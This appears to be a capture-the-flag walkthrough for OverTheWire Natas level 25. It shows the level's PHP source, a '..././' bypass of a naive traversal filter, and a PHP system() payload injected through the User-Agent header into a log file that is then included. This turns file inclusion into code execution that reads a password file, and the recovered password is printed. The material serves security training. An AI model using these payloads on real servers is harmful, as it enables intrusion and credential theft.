`Link`: `https://overthewire.org/wargames/natas/natas25.html`

## [𝐖𝐚𝐥𝐤𝐭𝐡𝐫𝐨𝐮𝐠𝐡] ~ 𝐍𝐚𝐭𝐚𝐬 𝐋𝐞𝐯𝐞𝐥 𝟐𝟒 - 𝐋𝐞𝐯𝐞𝐥 𝟐𝟓
## 𝐆𝐢𝐯𝐞𝐧

- Username: natas25
- URL:      `http://natas25.natas.labs.overthewire.org`

## 𝐒𝐨𝐥𝐮𝐭𝐢𝐨𝐧
- Visit:      `http://natas25.natas.labs.overthewire.org`
- `view source`

```
<?php
    // cheers and <3 to malvina
    // - morla

    function setLanguage(){
        /* language setup */
        if(array_key_exists("lang",$_REQUEST))
            if(safeinclude("language/" . $_REQUEST["lang"] ))
                return 1;
        safeinclude("language/en"); 
    }
    
    function safeinclude($filename){
        // check for directory traversal
        if(strstr($filename,"../")){
            logRequest("Directory traversal attempt! fixing request.");
            $filename=str_replace("../","",$filename);
        }
        // dont let ppl steal our passwords
        if(strstr($filename,"natas_webpass")){
            logRequest("Illegal file access detected! Aborting!");
            exit(-1);
        }
        // add more checks...

        if (file_exists($filename)) { 
            include($filename);
            return 1;
        }
        return 0;
    }
    
    function listFiles($path){
        $listoffiles=array();
        if ($handle = opendir($path))
            while (false !== ($file = readdir($handle)))
                if ($file != "." && $file != "..")
                    $listoffiles[]=$file;
        
        closedir($handle);
        return $listoffiles;
    } 
    
    function logRequest($message){
        $log="[". date("d.m.Y H::i:s",time()) ."]";
        $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
        $log=$log . " \"" . $message ."\"\n"; 
        $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
        fwrite($fd,$log);
        fclose($fd);
    }
?>

```

- `?lang=../..././/logs/natas25_pnif92ngghldgnvqj04scd05v2.log`
- `User-Agent: <?php system('cat /etc/natas_webpass/natas26');?>`
![image](https://user-images.githubusercontent.com/68887544/150163394-8ce7c650-b5eb-4ed9-89ae-f5d72808d714.png)

```

[19.01.2022 10::24:52] Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0 "Directory traversal attempt! fixing request."
[19.01.2022 10::25:14] Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0 "Directory traversal attempt! fixing request."
[19.01.2022 10::25:48] Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0 "Directory traversal attempt! fixing request."
[19.01.2022 10::26:56] Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0 "Directory traversal attempt! fixing request."
[19.01.2022 10::29:02] oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T
 "Directory traversal attempt! fixing request."
```
- `[19.01.2022 10::29:02] oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T`


## 𝐋𝐞𝐚𝐫𝐧𝐢𝐧𝐠

- LFI to RCE
- `../` replaced with `""` bypass using `..././`


